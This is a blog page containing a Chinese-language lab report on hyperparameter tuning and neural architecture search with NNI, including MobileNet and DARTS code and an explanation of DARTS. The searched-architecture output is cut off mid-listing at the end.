<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">


<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"garen-wang.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Garen Wang&#39;s Blog">
<meta property="og:url" content="http://garen-wang.top/page/3/index.html">
<meta property="og:site_name" content="Garen Wang&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Garen Wang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://garen-wang.top/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Garen Wang's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Garen Wang's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>


</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/03/11/NNI-Student-Program-2020-Task2.2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/11/NNI-Student-Program-2020-Task2.2/" class="post-title-link" itemprop="url">NNI Student Program 2020 Task2.2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-11 20:08:57" itemprop="dateCreated datePublished" datetime="2021-03-11T20:08:57+08:00">2021-03-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task2-2-实验报告"><a href="#Task2-2-实验报告" class="headerlink" title="Task2.2 实验报告"></a>Task2.2 实验报告</h1><h2 id="超参调优"><a href="#超参调优" class="headerlink" title="超参调优"></a>超参调优</h2><p>NNI支持通过配置搜索空间自定义搜索结构，不仅能够运用SOTA的高效率算法进行自动超参调优，更能够在多个模型与超参中选择出性能更优的组合，从而提高模型准确率。</p>
<p>搜索空间配置文件如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="number">0.01</span>, <span class="number">0.001</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;optimizer&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="string">&quot;Adadelta&quot;</span>, <span class="string">&quot;Adagrad&quot;</span>, <span class="string">&quot;Adam&quot;</span>, <span class="string">&quot;Adamax&quot;</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;model&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="string">&quot;vgg&quot;</span>, <span class="string">&quot;resnet18&quot;</span>, <span class="string">&quot;googlenet&quot;</span>, <span class="string">&quot;densenet121&quot;</span>, <span class="string">&quot;mobilenet&quot;</span>, <span class="string">&quot;dpn92&quot;</span>, <span class="string">&quot;shufflenetg2&quot;</span>,<span class="string">&quot;senet18&quot;</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码中，当前trial的超参组合可从<code>nni.get_next_parameter()</code>获得，并以dict的形式保存。</p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>由于设备性能有限，在进行NNI的HPO实验时每个trial的epoch数并没能设定得足够多，这极有可能会导致最终的实验结果与retrain的性能不相符。我们训练了HPO实验中metric最优的超参组合，后续效果却不尽人意。反而是在非最优的超参组合中，我们训练出了较好的效果。</p>
<p>最终我们选定了学习率为0.01，优化器为Adamax，神经网络模型为mobilenet的组合，并在重训练了200个epoch后取得了96.66%的准确率。</p>
<h2 id="Classic-NAS"><a href="#Classic-NAS" class="headerlink" title="Classic NAS"></a>Classic NAS</h2><p>通过上一步得到的模型与参数的组合，我们尝试在搜索空间上定义随机结构，测试模型的性能。</p>
<p>神经网络的随机结构可以借助NNI的经典NAS算法来实现，随机架构的搜索tuner可以在NNI的example中找到。</p>
<p>编写随机结构的搜索空间时，可以使用<code>nni.nas.pytorch.mutables</code>中的<code>LayerChoice</code>和<code>Inputchoice</code>来进行实现。</p>
<p>这两种定义待选连接的方式都很方便。<code>LayerChoice</code>在代码使用上可视作与其他普通神经网络等同，而要实现<code>InputChoice</code>所代表的跳过连接，则与<code>InputChoice</code>的输出进行concat操作即可。</p>
<p>这里定义了MobileNet的随机结构，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, out_channels, stride</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Block, self).__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line">        self.out_channels = out_channels</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels, in_channels, <span class="number">3</span>, stride, <span class="number">1</span>, bias=<span class="literal">False</span>, groups=in_channels)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(in_channels)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels, out_channels, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, bias=<span class="literal">False</span>)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(out_channels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))</span><br><span class="line">        x = F.relu(self.bn2(self.conv2(x)))</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_make_mobilenet_layers</span>(<span class="params">in_channels</span>):</span></span><br><span class="line">    cfg = [<span class="number">64</span>, (<span class="number">128</span>, <span class="number">2</span>), <span class="number">128</span>, <span class="number">128</span>, (<span class="number">256</span>, <span class="number">2</span>), <span class="number">256</span>, <span class="number">256</span>, (<span class="number">512</span>, <span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, (<span class="number">1024</span>, <span class="number">2</span>), <span class="number">1024</span>, <span class="number">1024</span>]</span><br><span class="line">    layers = nn.ModuleList()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cfg:</span><br><span class="line">        out_channels = x <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">int</span>) <span class="keyword">else</span> x[<span class="number">0</span>]</span><br><span class="line">        stride = <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">int</span>) <span class="keyword">else</span> x[<span class="number">1</span>]</span><br><span class="line">        layers.append(Block(in_channels, out_channels, stride))</span><br><span class="line">        in_channels = out_channels</span><br><span class="line">    <span class="keyword">return</span> layers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MobileNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(MobileNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=<span class="literal">False</span>)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        self.layers = _make_mobilenet_layers(<span class="number">32</span>)</span><br><span class="line">        self.pool = nn.AvgPool2d(<span class="number">2</span>)</span><br><span class="line">        self.linear = nn.Linear(<span class="number">1024</span>, <span class="number">10</span>)</span><br><span class="line">        self.skipconnect1 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip1&#x27;</span>)</span><br><span class="line">        self.skipconnect2 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip2&#x27;</span>)</span><br><span class="line">        self.skipconnect3 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip3&#x27;</span>)</span><br><span class="line">        self.skipconnect4 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip4&#x27;</span>)</span><br><span class="line">        self.skipconnect5 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip5&#x27;</span>)</span><br><span class="line">        self.skipconnect6 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        cnt = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> self.layers:</span><br><span class="line">            old_x = x</span><br><span class="line">            x = block(x)</span><br><span class="line">            <span class="keyword">if</span> block.in_channels == block.out_channels:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">2</span> <span class="keyword">and</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                zero_x = torch.zeros_like(old_x)</span><br><span class="line">                skipconnect = <span class="built_in">eval</span>(<span class="string">&#x27;self.skipconnect&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cnt))</span><br><span class="line">                skip_x = skipconnect([zero_x, old_x])</span><br><span class="line">                x = torch.add(x, skip_x)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        x = self.pool(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.linear(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task2.2/capture.png">
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task2.2/capture2.png">
<h2 id="One-Shot-NAS"><a href="#One-Shot-NAS" class="headerlink" title="One-Shot NAS"></a>One-Shot NAS</h2><p>上一步的经典NAS算法对原始模型的改动较小，也得不到较大的优化效果。并且，在6层可选跳过的情况下，神经网络的深度会下降，挖掘深层特征的潜力也会有所降低，所以最后准确率不仅没有升高，反而效果不尽人意。</p>
<p>在这一步，我们尝试One-Shot NAS，通过定义DARTS的搜索空间，大幅度改变原有模型，尝试真正意义上提高预测的精确度至97%以上。</p>
<h3 id="DARTS原理简要分析"><a href="#DARTS原理简要分析" class="headerlink" title="DARTS原理简要分析"></a>DARTS原理简要分析</h3><p>DARTS全称Differentiable Architecture Search，是NAS领域中著名的算法之一。该算法的特色是将若干个待搜索的架构从互不关联的“黑箱优化”问题变成可松弛的连续优化问题，通过梯度下降来进行更新。</p>
<p>由于需求只是构造MobileNet的搜索空间，这里只对CNN的DARTS进行分析。</p>
<p>首先，如果将一个状态看作一个节点，把一种操作看作一条边，那么CNN的网络模型就可以抽象成一个有向无环图（DAG）。</p>
<p>而在我们进行搜索的过程中，两点之间其实包含有“重边”。这些“重边”虽然两端节点相同，但各代表着不同的操作。我们需要做的，就是在这些待选边中找出整体最适合的一条边来成为DAG的一部分，实现架构的搜索。</p>
<p>我们首先给cell下定义。一个cell是一个包含了$N$个节点的有向无环图。其中编号为$i$的节点$x^{(i)}$代表着特征所存在着的状态，而从$i$到$j$的一条有向边就代表着一种操作，这种操作记为$o^{(i,j)}$。</p>
<p>接下来定义cell的输入与输出。一个cell会有两个输入，而只会有一个输出。这个cell的输出是将所有前面节点的操作concat起来的结果。用公式写出来就是：</p>
<script type="math/tex; mode=display">x^{(j)} = \int_{i<j} o^{(i, j)}(x^{(i)})</script><p>这里$o^{(i,j)}(x)$代表着将$x$所代表的状态经过$(i,j)$这条有向边所代表的操作后所得到的新状态。正如直观感觉一般，也就是可以抽象成一个函数。</p>
<p>一条边所代表的，可以是一个池化层，可以是标准的Conv+BatchNorm组合，也可以是SkipConnect等其他的子模型。</p>
<p>定义的这些模型只需要满足一个共性：需要满足原数据的width和height不能改变。也就是类似于：</p>
<p>当卷积核size为3x3时，padding为1；当kernal size为5x5时，padding为2；当kernal size为1x1时，padding为0…</p>
<p>接下来令$x^{(i)}$和$x^{(j)}$这两点之间的$n$条所有候选边的集合为$\mathcal{O}$，$\alpha_o^{(i,j)}$是一个$n$维的向量，分别代表着每一个待选操作的得分。将这些得分进行softmax运算进行松弛，公式如下：</p>
<script type="math/tex; mode=display">\overline o^{(i,j)}(x) = \sum_{o\in \mathcal{O}}\frac{\exp(\alpha_o^{(i,j)})}{\sum_{o'\in \mathcal{O}} \exp(\alpha_{o'}^{(i,j)})}o(x)</script><p>$\overline o^{(i,j)}(x)$最终最可能会选中得分最高的架构，即：</p>
<script type="math/tex; mode=display">o^{(i,j)}=\argmax_{o\in \mathcal{O}}\alpha_o^{(i,j)}</script><p>最终我们所求的是集合$\alpha=\{\alpha^{(i,j)}\}$。</p>
<p>如何求得$\alpha$？我们需要训练集和验证集的协助。</p>
<p>设训练集和验证集的loss分别为$\mathcal{L}_{train}$和$\mathcal{L}_{val}$。我们要求$\alpha$，最理想的状况是存在最优架构$\alpha^\star$, 能够使得$\mathcal L_{val}(w^\star, \alpha^\star)$达到最小。而最优参数$w^\star$是通过训练集不断地训练出来的。也就是$w^\star= \argmin _w \mathcal{L}_{train}(w, \alpha^\star)$。</p>
<p>这样就需要解决一个双优化问题：</p>
<script type="math/tex; mode=display">\begin{aligned}
    & \min_\alpha \mathcal L_{val}(w^*, \alpha^*) \\
    &s. t. \quad w^*=\argmin_w \mathcal L_{train}(w, \alpha^*)
\end{aligned}</script><p>求解这个双优化问题的算法大体的思路是：固定架构参数，用训练数据集训练模型参数，再固定模型参数，用验证数据集训练架构参数。</p>
<p>DARTS算法将动辄耗费上千个GPU天的神经网络架构搜索缩短至1至4个GPU天，使得NAS应用的门槛和成本大幅度降低。</p>
<h2 id="代码实现部分"><a href="#代码实现部分" class="headerlink" title="代码实现部分"></a>代码实现部分</h2><p>由于NNI中对DARTS的基本单位cell做了封装，候选边已经包含了常见的SepConv3x3、SepConv5x5、DilConv3x3、DivConv5x5、平均池化层、最大池化层、跳过连接层等候选架构，可以通过调用<code>nni.nas.pytorch.search_space_zoo.DartsCell</code>直接使用默认cell结构。</p>
<p>最终待搜索的模型可以基于<code>DartsCell</code>来构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DartsStackedCells</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drop_path_probability</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        <span class="keyword">for</span> module <span class="keyword">in</span> self.modules():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(module, DropPath):</span><br><span class="line">                module.p = p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, channels, n_classes, n_layers, n_nodes=<span class="number">4</span>, stem_multiplier=<span class="number">2</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DartsStackedCells, self).__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line">        self.channels = channels</span><br><span class="line">        self.n_classes = n_classes</span><br><span class="line">        self.n_layers = n_layers</span><br><span class="line">        cur_channels = stem_multiplier * self.channels</span><br><span class="line">        self.stem = nn.Sequential(</span><br><span class="line">            nn.Conv2d(in_channels, cur_channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=<span class="literal">False</span>),</span><br><span class="line">            nn.BatchNorm2d(cur_channels)</span><br><span class="line">        )</span><br><span class="line">        pp_channels, p_channels, cur_channels = cur_channels, cur_channels, channels</span><br><span class="line">        self.cells = nn.ModuleList()</span><br><span class="line">        p_reduction, cur_reduction = <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_layers):</span><br><span class="line">            p_reduction, cur_reduction = cur_reduction, <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> [n_layers // <span class="number">3</span>, <span class="number">2</span> * n_layers // <span class="number">3</span>]:</span><br><span class="line">                cur_channels *= <span class="number">2</span></span><br><span class="line">                cur_reduction = <span class="literal">True</span></span><br><span class="line">            self.cells.append(DartsCell(n_nodes, pp_channels, p_channels, cur_channels, p_reduction, cur_reduction))</span><br><span class="line">            cur_channels_out = cur_channels * n_nodes</span><br><span class="line">            pp_channels, p_channels = p_channels, cur_channels_out</span><br><span class="line">        self.gap = nn.AdaptiveAvgPool2d(<span class="number">1</span>)</span><br><span class="line">        self.linear = nn.Linear(p_channels, n_classes)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        s0 = s1 = self.stem(x)</span><br><span class="line">        <span class="keyword">for</span> cell <span class="keyword">in</span> self.cells:</span><br><span class="line">            s0, s1 = s1, cell(s0, s1)</span><br><span class="line">        output = self.gap(s1)</span><br><span class="line">        output = output.view(output.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        output = self.linear(output)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终搜索出的结构如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;normal_n2_p0&quot;</span>: <span class="string">&quot;sepconv5x5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n2_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n2_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n2_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n2_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n3_p0&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n3_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n3_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n3_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n3_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n3_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n4_p0&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n4_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n4_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n4_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n4_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n4_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n4_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p0&quot;</span>: <span class="string">&quot;dilconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n5_p1&quot;</span>: <span class="string">&quot;dilconv5x5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n5_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p4&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n5_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n5_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n2_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n2_p1&quot;</span>: <span 